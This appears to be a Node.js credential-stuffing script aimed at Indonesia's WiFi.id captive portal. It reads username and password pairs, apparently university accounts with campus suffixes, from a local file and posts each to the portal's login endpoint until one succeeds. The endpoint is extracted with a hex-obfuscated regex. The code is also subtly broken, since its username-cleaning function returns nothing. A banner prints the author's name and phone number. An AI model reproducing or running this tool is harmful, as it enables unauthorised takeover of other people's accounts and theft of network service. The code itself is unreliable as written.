const req = require("request");
const gexurl = /\x76\x61\x72\x20\x75\x72\x6c\x78\x20\x20\x20\x20\x20\x20\x20\x20\x3d\x20\x27(.*?)\x27\x3b/mg;
const read = require("readline");
const fs = require("fs");
const readi = read.createInterface({
  input: process.stdin,
  output: process.stdout
});
const CLEAR = '\x1b\x5b\x33\x4a\x1b\x5b\x48\x1b\x5b\x32\x4a';

var trigger;
var real_url;

function swKampus(a){
  switch (a.split("@")[1]) {
    case "unej":
    t = (a = a.replace("@unej", ""));
    break;
    case "umaha":
    t = (a = a.replace("@umaha", ""));
    break;
    case "itdel":
    t = (a = a.replace("@itdel", ""));
    break;
    case "polije":
    t = (a = a.replace("@polije", ""));
    break;
    case "unsiq":
    t = (a = a.replace("@unsiq", ""));
    break;
   } 
    return;
}
function fexit(){
  process.exit();
}

function find_url(process){
  req(trigger,(e,r,b)=>{
    let m = gexurl.exec(b);
    
    if(!Array.isArray(m)){
      console.log("Can't find post URL!");
      fexit();
    }

    real_url = m[1];

    process();
  })
}
function readStream(err, data) {

  if (err) {
    throw err;
  }

  let content = data.toString().split("\n");

  for(let c=0;c<content.length;c++){
    let acc = content[c].split("|");
    let uname = swKampus(acc[0]);

    let payload = {
      "username": uname,
      "password": acc[1],
      "landURL": ""
    };

    req.post({
      url: real_url,
      form: payload
    }, function postRequest(e,r,b) {
      try{
        let prsed = JSON.parse(b);

        if(prsed.result==1){
          console.log("\x1b[32m"+payload.username+" | Result ["+prsed.result+"]"+" | Message = "+prsed.message+"\x1b[0m");

          fexit();
        } else{
          console.log(payload.username+" | Result ["+prsed.result+"]"+" | Message = "+prsed.message+"\x1b[0m");
        }

      }
      catch (error){
        console.log("\x1b[31m"+"Skipping Response [Invalid Content-Type]"+"\x1b[0m");
      }

    })
  }
}

function processx(){
  console.log("Mohon Tunggu Sebentar... \n");
  fs.readFile('assets/merge.txt', readStream);
}

console.log("\n==============================================\n\n=======> TOOLS AUTO CONNECT WIFI-ID <=======\n\n============================================== \n|| +--------------------------------------+ ||\n|| | Creator : Bintang Nur Pradana        | ||\n|| +--------------------------------------+ ||\n|| | Facebook : Bintang Nur Pradana       | ||\n|| | WhatsApp : 081329896085              | ||\n|| | Team : Garuda Terisakti 72           | ||\n|| +--------------------------------------+ ||\n============================================== \n");
readi.question("Pastekan link url Wifi-Id \n\nContoh: https://welcome2.wifi.id/login/?gw_id=xxx-xx-xxx&client_mac=xx:xx:xx:xx:xx:xx&wlan=XXXXXXXXXXX/XXX-XXXXXXXX-XXXX:@wifi.id&sessionid=XXXXXXXXXXXXXXXX-XXXXXXXX&redirect=http://8.8.8.8/ \n\n(http/s): ",(ix) => {
  if(ix.length==0){
    console.log("\nURL Salah Bre! \nMasukan Url dengan benar!\n");
    fexit();
  }

  trigger = ix;
  readi.close();
  find_url(processx);
});
